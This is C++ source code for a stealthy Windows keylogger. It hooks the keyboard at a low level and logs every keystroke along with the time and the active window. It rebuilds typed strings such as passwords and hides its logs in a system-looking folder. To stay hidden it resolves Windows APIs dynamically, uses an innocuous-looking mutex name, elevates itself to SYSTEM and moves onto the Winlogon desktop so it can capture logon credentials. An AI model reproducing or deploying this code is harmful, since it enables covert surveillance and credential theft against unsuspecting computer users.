#include <windows.h>
#include "functions.h"
#include <string>

pLoadLibraryA MyLoadLibraryA = NULL;
pGetProcAddress MyGetProcAddress = NULL;

typedef HANDLE(WINAPI* pCreateMutexW)(LPSECURITY_ATTRIBUTES, BOOL, LPCWSTR);
typedef BOOL(WINAPI* pCloseHandle)(HANDLE);
typedef DWORD(WINAPI* pGetLastError)(void);
typedef PWSTR(WINAPI* pGetCommandLineW)(void);
typedef HANDLE(WINAPI* pCreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, PDWORD);
typedef HHOOK(WINAPI* pSetWindowsHookExW)(int, HOOKPROC, HINSTANCE, DWORD);
typedef BOOL(WINAPI* pGetMessageW)(LPMSG, HWND, UINT, UINT);
typedef LRESULT(CALLBACK* pCallNextHookEx)(HHOOK, int, WPARAM, LPARAM);
typedef void(WINAPI* pGetKeyboardState)(PBYTE);
typedef SHORT(WINAPI* pGetKeyState)(int);
typedef int(WINAPI* pGetKeyNameTextW)(LONG, LPWSTR, int);
typedef int(WINAPI* pToUnicodeEx)(UINT, UINT, const BYTE*, LPWSTR, int, UINT, HKL);
typedef HKL(WINAPI* pGetKeyboardLayout)(DWORD);

pCreateMutexW MyCreateMutexW = NULL;
pCloseHandle MyCloseHandle = NULL;
pGetLastError MyGetLastError = NULL;
pGetCommandLineW MyGetCommandLineW = NULL;
pCreateThread MyCreateThread = NULL;
pSetWindowsHookExW MySetWindowsHookExW = NULL;
pGetMessageW MyGetMessageW = NULL;
pCallNextHookEx MyCallNextHookEx = NULL;
pGetKeyState MyGetKeyState = NULL;
pGetKeyNameTextW MyGetKeyNameTextW = NULL;
pToUnicodeEx MyToUnicodeEx = NULL;
pGetKeyboardState MyGetKeyboardState = NULL;
pGetKeyboardLayout MyGetKeyboardLayout = NULL;

std::wstring lastInput;
bool LshiftDown = false;
bool RshiftDown = false;
ULONGLONG nextLogTime = 0;

inline void LogLastInput() {
	std::wstring finalInput = L"Last input: " + lastInput;
	std::wstring enterLog;
	enterLog.append(finalInput).append(L" \t ").append(GetCurrentTimeAsString())
		.append(L" \t ").append(GetCurrentWindow()).append(L"\n");
	WriteKeyLogToLogFileSystemHidden(enterLog);
	lastInput.clear();
}

LRESULT CALLBACK KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode < 0) return MyCallNextHookEx(0, nCode, wParam, lParam);

	KBDLLHOOKSTRUCT kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
	int msg = 1 + (kbdStruct.scanCode << 16) + (kbdStruct.flags << 24);

	uint8_t scanCode = (msg >> 16) & 0xFF;
	if (scanCode == 0x2A && wParam == WM_KEYDOWN) LshiftDown = true;
	else if (scanCode == 0x2A && wParam == WM_KEYUP) LshiftDown = false;
	if (scanCode == 0x36 && wParam == WM_KEYDOWN) RshiftDown = true;
	else if (scanCode == 0x36 && wParam == WM_KEYUP) RshiftDown = false;

	wchar_t keyName[64]{};
	MyGetKeyNameTextW(msg, keyName, 64);
	wchar_t keyState[16]{};
	switch (wParam) {
	case WM_KEYUP: wcsncpy_s(keyState, L"Key Up\0", 16); break;
	case WM_KEYDOWN: wcsncpy_s(keyState, L"Key Down\0", 16); break;
	case WM_SYSKEYUP: wcsncpy_s(keyState, L"Sys Key Up\0", 16); break;
	case WM_SYSKEYDOWN: wcsncpy_s(keyState, L"Sys Key Down\0", 16); break;
	}

	std::wstring ResultLog;
	ResultLog.append(keyName).append(L" \t ").append(keyState).append(L" \t ")
		.append(GetCurrentTimeAsString()).append(L" \t ").append(GetCurrentWindow()).append(L"\n");
	WriteKeyLogToLogFileSystemHidden(ResultLog);

	if (scanCode == 0x1C && wParam == WM_KEYDOWN && !lastInput.empty()) {
		LogLastInput();
	}

	if (scanCode != 0x1C && wParam == WM_KEYDOWN) {
		BYTE keystate[256] = { 0 };
		MyGetKeyboardState(keystate);
		keystate[VK_SHIFT] = (LshiftDown || RshiftDown) ? 0x80 : 0;
		keystate[VK_CAPITAL] = (MyGetKeyState(VK_CAPITAL) & 0x0001) ? 0x80 : 0;

		wchar_t actualChar[2] = { 0 };
		int result = MyToUnicodeEx(kbdStruct.vkCode, scanCode, keystate, actualChar, 2, 0, MyGetKeyboardLayout(0));
		if (result == 1 && actualChar[0] != 0) {
			if (!LshiftDown && !RshiftDown) {
				std::wstring ws(actualChar);
				if (iswalpha(actualChar[0])) ws = ToLower(ws);
				lastInput += ws;
			}
			else {
				lastInput += actualChar[0];
			}
			nextLogTime = GetTickCount64() + 10000;
		}
	}

	return MyCallNextHookEx(0, nCode, wParam, lParam);
}

DWORD WINAPI LastInputLoggerThread(void*)
{
	while (true)
	{
		if (nextLogTime && (GetTickCount64() > nextLogTime) && !lastInput.empty())
		{
			LogLastInput();
			nextLogTime = 0;
		}
		Sleep(50);
	}
}

INT WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow)
{
	HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
	if (!hKernel32) return 1;
	MyGetProcAddress = (pGetProcAddress)GetProcAddress(hKernel32, "GetProcAddress");
	MyLoadLibraryA = (pLoadLibraryA)MyGetProcAddress(hKernel32, "LoadLibraryA");
	if (!MyGetProcAddress || !MyLoadLibraryA) return 1;

	HMODULE hKernel32Mod = GetModuleHandleA("kernel32.dll");
	MyCreateMutexW = (pCreateMutexW)MyGetProcAddress(hKernel32Mod, "CreateMutexW");
	MyCloseHandle = (pCloseHandle)MyGetProcAddress(hKernel32Mod, "CloseHandle");
	MyGetLastError = (pGetLastError)MyGetProcAddress(hKernel32Mod, "GetLastError");
	MyGetCommandLineW = (pGetCommandLineW)MyGetProcAddress(hKernel32Mod, "GetCommandLineW");
	MyCreateThread = (pCreateThread)MyGetProcAddress(hKernel32Mod, "CreateThread");

	HMODULE hUser32 = MyLoadLibraryA("User32.dll");
	if (hUser32)
	{
		MySetWindowsHookExW = (pSetWindowsHookExW)MyGetProcAddress(hUser32, "SetWindowsHookExW");
		MyGetMessageW = (pGetMessageW)MyGetProcAddress(hUser32, "GetMessageW");
		MyCallNextHookEx = (pCallNextHookEx)MyGetProcAddress(hUser32, "CallNextHookEx");
		MyGetKeyNameTextW = (pGetKeyNameTextW)MyGetProcAddress(hUser32, "GetKeyNameTextW");
		MyGetKeyboardState = (pGetKeyboardState)MyGetProcAddress(hUser32, "GetKeyboardState");
		MyGetKeyState = (pGetKeyState)MyGetProcAddress(hUser32, "GetKeyState");
		MyToUnicodeEx = (pToUnicodeEx)MyGetProcAddress(hUser32, "ToUnicodeEx");
		MyGetKeyboardLayout = (pGetKeyboardLayout)MyGetProcAddress(hUser32, "GetKeyboardLayout");
	}

	HANDLE hMutex = MyCreateMutexW(nullptr, TRUE, L"Global\\syshelp");
	if (MyGetLastError && MyGetLastError() == ERROR_ALREADY_EXISTS)
		return 0;

	bool IsRunningAsSystem = isRunningAsSystem();

	if (!IsRunningAsSystem) if (!RelaunchAsSystem(MyGetCommandLineW ? MyGetCommandLineW() : L""))
	{
		// For logging
		return 1;
	}
	else return 0;


	if (GetCurrentDesktopName() == L"Default") if (!RelaunchWithWINLOGONDesktop(MyGetCommandLineW ? MyGetCommandLineW() : L""))
	{
		// For logging
		return 2;
	}
	else return 0;

	CreateDirectoryRecursive(LR"(C:\Windows\IdentityCRL\production)");

	MyCloseHandle(MyCreateThread(nullptr, 0, LastInputLoggerThread, nullptr, 0, nullptr));
	MySetWindowsHookExW(WH_KEYBOARD_LL, KeyboardHook, NULL, 0);
	while (MyGetMessageW(0, 0, 0, 0));
}